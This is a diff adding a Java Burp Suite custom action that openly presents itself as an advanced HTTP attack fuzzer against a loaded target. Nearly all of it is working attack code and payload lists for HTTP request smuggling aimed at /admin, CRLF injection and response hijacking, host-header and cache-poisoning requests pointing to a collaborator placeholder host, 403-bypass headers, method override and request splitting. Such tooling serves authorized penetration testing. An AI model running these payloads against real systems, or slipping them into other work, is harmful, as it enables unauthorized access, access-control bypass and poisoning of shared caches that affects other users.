@@ -1,0 +1,488 @@
+// Advanced HTTP Attack Bambda Custom Action by zinja-coder@github
+// This Bambda performs advanced HTTP-level attacks including:
+// - HTTP Request Smuggling (CL.TE, TE.CL, TE.TE)
+// - CRLF Injection
+// - Host Header Injection
+// - 403 Bypass techniques
+// - Content-Type conversion attacks
+// - HTTP Method Override
+// - Header Pollution
+// - Cache Poisoning attempts
+
+// Delay variable, Adjust as per requirement - 1000 = 1 second delay
+int GLOBAL_DELAY_MS = 200;
+
+// Burp Collborator host or any host name like example.com
+String hostname = "<BURPCOLLABORATOR>";
+
+// 403 Bypass Headers
+String[] BYPASS_HEADERS = {
+    "X-Forwarded-For",
+    "X-Real-IP", 
+    "X-Originating-IP",
+    "X-Forwarded-Host",
+    "X-Remote-IP",
+    "X-Remote-Addr",
+    "X-ProxyUser-Ip",
+    "X-Original-URL",
+    "X-Rewrite-URL",
+    "X-Forwarded-Proto",
+    "X-Forwarded-Scheme"
+};
+
+String[] BYPASS_IPS = {
+    "127.0.0.1",
+    "127...1",
+    "localhost",
+    "0.0.0.0",
+    "10.0.0.1",
+    "192.168.1.1",
+    "172.16.0.1"
+};
+
+// HTTP Methods for Override Testing
+String[] HTTP_METHODS = {
+    "GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE", "CONNECT"
+};
+
+// Method Override Headers
+String[] METHOD_OVERRIDE_HEADERS = {
+    "X-HTTP-Method-Override",
+    "X-HTTP-Method",
+    "X-Method-Override",
+    "_method"
+};
+
+// Host Header Injection Payloads
+String[] HOST_PAYLOADS = {
+    hostname,
+    "localhost",
+    "127.0.0.1",
+    "0.0.0.0",
+    "internal.local"
+};
+
+// CRLF Injection Payloads
+String[] CRLF_PAYLOADS = {
+    "\r\nX-Injected: true",
+    "\r\n\r\nHTTP/1.1 200 OK\r\nContent-Length: 19\r\n\r\nHijacked Response",
+    "\n\rX-Injected: crlf",
+    "%0d%0aX-Injected: encoded",
+    "%0a%0dX-Injected: reversed",
+    "\r\nSet-Cookie: injected=true",
+    "\r\nLocation: http://"+hostname
+};
+
+// Cache Poisoning Headers
+String[] CACHE_HEADERS = {
+    "X-Forwarded-Host",
+    "X-Host",
+    "X-Forwarded-Server",
+    "X-HTTP-Host-Override",
+    "Forwarded"
+};
+
+// Get the original request
+var originalRequest = requestResponse.request();
+var httpService = requestResponse.httpService();
+var originalHeaders = originalRequest.headers();
+var originalBody = originalRequest.body();
+
+logging.logToOutput("[ ======================================= ]");
+logging.logToOutput("ADVANCED HTTP ATTACK FUZZER STARTED");
+logging.logToOutput("Target: " + httpService.host() + ":" + httpService.port());
+logging.logToOutput("Original Method: " + originalRequest.method());
+logging.logToOutput("Original Path: " + originalRequest.path());
+logging.logToOutput("[ ======================================= ]");
+logging.logToOutput("CHECK ORGANIZER TAB FOR OUTPUT");
+logging.logToOutput("[ ======================================= ]");
+
+int totalRequests = 0;
+
+// -------------------------- Test 1: HTTP Request Smuggling CL.TE -------------------- //
+logging.logToOutput("[ === Testing HTTP Request Smuggling CL.TE === ]");
+
+// CL.TE Attack - Content-Length and Transfer-Encoding conflict
+String smuggledBody = "GET /admin HTTP/1.1\r\nHost: " + httpService.host() + "\r\n\r\n";
+String clTeBody = "0\r\n\r\n" + smuggledBody;
+
+try {
+    var clTeRequest = originalRequest.withBody(clTeBody.toString())
+        .withHeader("Content-Length", String.valueOf(clTeBody.length()))
+        .withHeader("Transfer-Encoding", "chunked");
+    
+    var response = api.http().sendRequest(clTeRequest);
+    Thread.sleep(GLOBAL_DELAY_MS);
+    
+    int status = response.response().statusCode();
+    String result = "HTTP Request Smuggling CL.TE -> Status: " + status;
+    logging.logToOutput("[ === " + result + " === ]");
+    
+    var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(clTeRequest, response.response());
+    requestResponseForOrganizer.annotations().setNotes(result);
+    api.organizer().sendToOrganizer(requestResponseForOrganizer);
+    totalRequests++;
+} catch (Exception e) {
+    logging.logToError("Error with CL.TE Smuggling: " + e.getMessage());
+}
+
+// -------------------------- Test 2: HTTP Request Smuggling TE.CL -------------------- //
+logging.logToOutput("[ === Testing HTTP Request Smuggling TE.CL === ]");
+
+String teclBody = "5\r\nAAAAA\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: " + httpService.host() + "\r\n\r\n";
+
+try {
+    var teClRequest = originalRequest.withBody(teclBody.toString())
+        .withHeader("Transfer-Encoding", "chunked")
+        .withHeader("Content-Length", "4");
+    
+    var response = api.http().sendRequest(teClRequest);
+    Thread.sleep(GLOBAL_DELAY_MS);
+    
+    int status = response.response().statusCode();
+    String result = "HTTP Request Smuggling TE.CL -> Status: " + status;
+    logging.logToOutput("[ === " + result + " === ]");
+    
+    var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(teClRequest, response.response());
+    requestResponseForOrganizer.annotations().setNotes(result);
+    api.organizer().sendToOrganizer(requestResponseForOrganizer);
+    totalRequests++;
+} catch (Exception e) {
+    logging.logToError("Error with TE.CL Smuggling: " + e.getMessage());
+}
+
+// -------------------------- Test 3: CRLF Injection -------------------- //
+logging.logToOutput("[ === Testing CRLF Injection === ]");
+
+for (String crlfPayload : CRLF_PAYLOADS) {
+    try {
+        // Try CRLF injection in various headers
+        var crlfRequest = originalRequest.withHeader("User-Agent", "Mozilla/5.0" + crlfPayload);
+        
+        var response = api.http().sendRequest(crlfRequest);
+        Thread.sleep(GLOBAL_DELAY_MS);
+        
+        int status = response.response().statusCode();
+        String result = "CRLF Injection in User-Agent: " + crlfPayload.replace("\r", "\\r").replace("\n", "\\n");
+        logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+        
+        var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(crlfRequest, response.response());
+        requestResponseForOrganizer.annotations().setNotes(result);
+        api.organizer().sendToOrganizer(requestResponseForOrganizer);
+        totalRequests++;
+    } catch (Exception e) {
+        logging.logToError("Error with CRLF Injection: " + e.getMessage());
+    }
+}
+
+// -------------------------- Test 4: Host Header Injection -------------------- //
+logging.logToOutput("[ === Testing Host Header Injection === ]");
+
+for (String hostPayload : HOST_PAYLOADS) {
+    try {
+        var hostRequest = originalRequest.withHeader("Host", hostPayload);
+        
+        var response = api.http().sendRequest(hostRequest);
+        Thread.sleep(GLOBAL_DELAY_MS);
+        
+        int status = response.response().statusCode();
+        String result = "Host Header Injection: " + hostPayload;
+        logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+        
+        var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(hostRequest, response.response());
+        requestResponseForOrganizer.annotations().setNotes(result);
+        api.organizer().sendToOrganizer(requestResponseForOrganizer);
+        totalRequests++;
+    } catch (Exception e) {
+        logging.logToError("Error with Host Header Injection: " + e.getMessage());
+    }
+}
+
+// -------------------------- Test 5: 403 Bypass Headers -------------------- //
+logging.logToOutput("[ === Testing 403 Bypass Headers === ]");
+
+for (String bypassHeader : BYPASS_HEADERS) {
+    for (String bypassIP : BYPASS_IPS) {
+        try {
+            var bypassRequest = originalRequest.withHeader(bypassHeader, bypassIP);
+            
+            var response = api.http().sendRequest(bypassRequest);
+            Thread.sleep(GLOBAL_DELAY_MS);
+            
+            int status = response.response().statusCode();
+            String result = "403 Bypass - " + bypassHeader + ": " + bypassIP;
+            logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+            
+            var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(bypassRequest, response.response());
+            requestResponseForOrganizer.annotations().setNotes(result);
+            api.organizer().sendToOrganizer(requestResponseForOrganizer);
+            totalRequests++;
+        } catch (Exception e) {
+            logging.logToError("Error with 403 Bypass: " + e.getMessage());
+        }
+    }
+}
+
+// -------------------------- Test 6: HTTP Method Override -------------------- //
+logging.logToOutput("[ === Testing HTTP Method Override === ]");
+
+for (String method : HTTP_METHODS) {
+    for (String overrideHeader : METHOD_OVERRIDE_HEADERS) {
+        try {
+            var methodRequest = originalRequest.withHeader(overrideHeader, method);
+            
+            var response = api.http().sendRequest(methodRequest);
+            Thread.sleep(GLOBAL_DELAY_MS);
+            
+            int status = response.response().statusCode();
+            String result = "Method Override - " + overrideHeader + ": " + method;
+            logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+            
+            var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(methodRequest, response.response());
+            requestResponseForOrganizer.annotations().setNotes(result);
+            api.organizer().sendToOrganizer(requestResponseForOrganizer);
+            totalRequests++;
+        } catch (Exception e) {
+            logging.logToError("Error with Method Override: " + e.getMessage());
+        }
+    }
+}
+
+// -------------------------- Test 7: Content-Type Conversion Attack -------------------- //
+logging.logToOutput("[ === Testing Content-Type Conversion === ]");
+
+String originalContentType = originalRequest.headerValue("Content-Type");
+// JSON to XML conversion
+if (originalContentType != null && originalContentType.contains("application/json") && originalBody.length() > 0) {
+    try {
+        String jsonBodyString = new String(originalBody.getBytes()); // Get original JSON body as string
+
+        // Basic clean-up: remove leading/trailing curly braces
+        String cleanedJson = jsonBodyString.trim();
+        if (cleanedJson.startsWith("{") && cleanedJson.endsWith("}")) {
+            cleanedJson = cleanedJson.substring(1, cleanedJson.length() - 1);
+        }
+
+        StringBuilder xmlBodyBuilder = new StringBuilder("<root>");
+
+        // Split by comma to get individual key-value pairs
+        String[] pairs = cleanedJson.split(",");
+
+        for (String pair : pairs) {
+            String trimmedPair = pair.trim();
+            // Split each pair by the first colon to separate key and value
+            int firstColonIndex = trimmedPair.indexOf(':');
+            if (firstColonIndex > 0) {
+                String key = trimmedPair.substring(0, firstColonIndex).trim().replace("\"", ""); // Remove quotes from key
+                String value = trimmedPair.substring(firstColonIndex + 1).trim().replace("\"", ""); // Remove quotes from value
+
+                // Simple XML element creation, escaping necessary characters is ideal but complex via string manip.
+                xmlBodyBuilder.append("<").append(key).append(">");
+                xmlBodyBuilder.append(value); // No XML entity encoding here for simplicity
+                xmlBodyBuilder.append("</").append(key).append(">");
+            }
+        }
+        xmlBodyBuilder.append("</root>");
+
+        String xmlBody = xmlBodyBuilder.toString();
+
+        var xmlRequest = originalRequest.withBody(xmlBody.toString()).withHeader("Content-Type", "application/xml");
+        
+        var response = api.http().sendRequest(xmlRequest);
+        Thread.sleep(GLOBAL_DELAY_MS); // Use a global delay for stability
+        
+        int status = response.response().statusCode();
+        String result = "Content-Type Conversion: JSON to XML (String Manipulated)";
+        logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+        
+        var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(xmlRequest, response.response());
+        requestResponseForOrganizer.annotations().setNotes(result);
+        api.organizer().sendToOrganizer(requestResponseForOrganizer);
+        totalRequests++;
+    } catch (Exception e) {
+        logging.logToError("Error with JSON to XML conversion and body modification: " + e.getMessage());
+    }
+}
+
+// Example: Form URL-encoded to JSON
+if (originalContentType != null && originalContentType.contains("application/x-www-form-urlencoded") && originalBody.length() > 0) {
+    try {
+        String formBodyString = new String(originalBody.getBytes());
+        StringBuilder jsonBodyBuilder = new StringBuilder("{");
+        String[] pairs = formBodyString.split("&");
+        boolean firstPair = true;
+
+        for (String pair : pairs) {
+            if (!firstPair) {
+                jsonBodyBuilder.append(", ");
+            }
+            int eqIndex = pair.indexOf('=');
+            if (eqIndex > 0) {
+                String key = pair.substring(0, eqIndex).trim();
+                String value = pair.substring(eqIndex + 1).trim();
+                jsonBodyBuilder.append("\"").append(key).append("\": \"").append(value).append("\"");
+            }
+            firstPair = false;
+        }
+        jsonBodyBuilder.append("}");
+        String jsonBody = jsonBodyBuilder.toString();
+
+        var jsonRequest = originalRequest.withBody(jsonBody.toString()).withHeader("Content-Type", "application/json");
+        var response = api.http().sendRequest(jsonRequest);
+        Thread.sleep(GLOBAL_DELAY_MS); // Use a global delay for stability
+        
+        int status = response.response().statusCode();
+        String result = "Content-Type Conversion: JSON to XML (String Manipulated)";
+        logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+        
+        var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(jsonRequest, response.response());
+        requestResponseForOrganizer.annotations().setNotes(result);
+        api.organizer().sendToOrganizer(requestResponseForOrganizer);
+        totalRequests++;
+    } catch (Exception e) {
+        logging.logToError("Error with Form URL-encoded to JSON conversion: " + e.getMessage());
+    }
+}
+
+
+// -------------------------- Test 8: Header Pollution -------------------- //
+logging.logToOutput("[ === Testing Header Pollution === ]");
+
+String[] pollutionHeaders = {"Accept", "Accept-Language", "Accept-Encoding", "User-Agent", "Authorization"};
+
+for (String header : pollutionHeaders) {
+    try {
+        // Add duplicate headers
+        var pollutedRequest = originalRequest.withAddedHeader(header, "injected-value");
+        
+        var response = api.http().sendRequest(pollutedRequest);
+        Thread.sleep(GLOBAL_DELAY_MS);
+        
+        int status = response.response().statusCode();
+        String result = "Header Pollution: Duplicate " + header;
+        logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+        
+        var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(pollutedRequest, response.response());
+        requestResponseForOrganizer.annotations().setNotes(result);
+        api.organizer().sendToOrganizer(requestResponseForOrganizer);
+        totalRequests++;
+    } catch (Exception e) {
+        logging.logToError("Error with Header Pollution: " + e.getMessage());
+    }
+}
+
+// -------------------------- Test 9: Cache Poisoning Attempts -------------------- //
+logging.logToOutput("[ === Testing Cache Poisoning === ]");
+
+for (String cacheHeader : CACHE_HEADERS) {
+    try {
+        var cacheRequest = originalRequest.withHeader(cacheHeader, hostname);
+        
+        var response = api.http().sendRequest(cacheRequest);
+        Thread.sleep(GLOBAL_DELAY_MS);
+        
+        int status = response.response().statusCode();
+        String result = "Cache Poisoning: " + cacheHeader + " -> " + hostname;
+        logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+        
+        var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(cacheRequest, response.response());
+        requestResponseForOrganizer.annotations().setNotes(result);
+        api.organizer().sendToOrganizer(requestResponseForOrganizer);
+        totalRequests++;
+    } catch (Exception e) {
+        logging.logToError("Error with Cache Poisoning: " + e.getMessage());
+    }
+}
+
+// -------------------------- Test 10: Request Splitting -------------------- //
+logging.logToOutput("[ === Testing Request Splitting === ]");
+
+try {
+    String splitPayload = originalRequest.path() + " HTTP/1.1\r\nHost: "+httpService.host()+"\r\n\r\nGET /";
+    String baseurl = originalRequest.url();
+    var splitRequest = burp.api.montoya.http.message.requests.HttpRequest.httpRequestFromUrl(baseurl + splitPayload);
+    
+    var response = api.http().sendRequest(splitRequest);
+    Thread.sleep(GLOBAL_DELAY_MS);
+    
+    int status = response.response().statusCode();
+    String result = "Request Splitting Attack";
+    logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+    
+    var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(splitRequest, response.response());
+    requestResponseForOrganizer.annotations().setNotes(result);
+    api.organizer().sendToOrganizer(requestResponseForOrganizer);
+    totalRequests++;
+} catch (Exception e) {
+    logging.logToError("Error with Request Splitting: " + e.getMessage());
+}
+
+// -------------------------- Test 11: HTTP Version Downgrade -------------------- //
+logging.logToOutput("[ === Testing HTTP Version Attacks === ]");
+
+String[] httpVersions = {"HTTP/1.0", "HTTP/0.9", "HTTP/2.0"};
+
+for (String version : httpVersions) {
+    try {
+        // Create request with different HTTP version
+        String requestString = originalRequest.method() + " " + originalRequest.path() + " " + version + "\r\n";
+        for (var header : originalHeaders) {
+            if (!header.name().equals(":method") && !header.name().equals(":path") && !header.name().equals(":scheme")) {
+                requestString += header.name() + ": " + header.value() + "\r\n";
+            }
+        }
+        requestString += "\r\n";
+        if (originalBody.length() > 0) {
+            requestString += new String(originalBody.getBytes());
+        }
+        
+        var versionRequest = burp.api.montoya.http.message.requests.HttpRequest.httpRequest(requestString);
+        //versionRequest.withService(httpService);
+        
+        var response = api.http().sendRequest(versionRequest);
+        Thread.sleep(GLOBAL_DELAY_MS);
+        
+        int status = response.response().statusCode();
+        String result = "HTTP Version Attack: " + version;
+        logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+        
+        var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(versionRequest, response.response());
+        requestResponseForOrganizer.annotations().setNotes(result);
+        api.organizer().sendToOrganizer(requestResponseForOrganizer);
+        totalRequests++;
+    } catch (Exception e) {
+        logging.logToError("Error with HTTP Version Attack: " + e.getMessage());
+    }
+}
+
+// -------------------------- Test 12: Double Content-Length -------------------- //
+logging.logToOutput("[ === Testing Double Content-Length === ]");
+
+if (originalBody.length() > 0) {
+    try {
+        var doubleClRequest = originalRequest
+            .withHeader("Content-Length", String.valueOf(originalBody.length()))
+            .withAddedHeader("Content-Length", "0");
+        
+        var response = api.http().sendRequest(doubleClRequest);
+        Thread.sleep(GLOBAL_DELAY_MS);
+        
+        int status = response.response().statusCode();
+        String result = "Double Content-Length Headers";
+        logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+        
+        var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(doubleClRequest, response.response());
+        requestResponseForOrganizer.annotations().setNotes(result);
+        api.organizer().sendToOrganizer(requestResponseForOrganizer);
+        totalRequests++;
+    } catch (Exception e) {
+        logging.logToError("Error with Double Content-Length: " + e.getMessage());
+    }
+}
+
+logging.logToOutput("[ ======================================= ]");
+logging.logToOutput("[ === ADVANCED HTTP ATTACK FUZZING DONE === ]");    
+logging.logToOutput("[ ======================================= ]");
+logging.logToOutput("Total Requests Sent: " + totalRequests);
+logging.logToOutput("Check the Organizer tab for detailed results");
+logging.logToOutput("[ ======================================= ]");
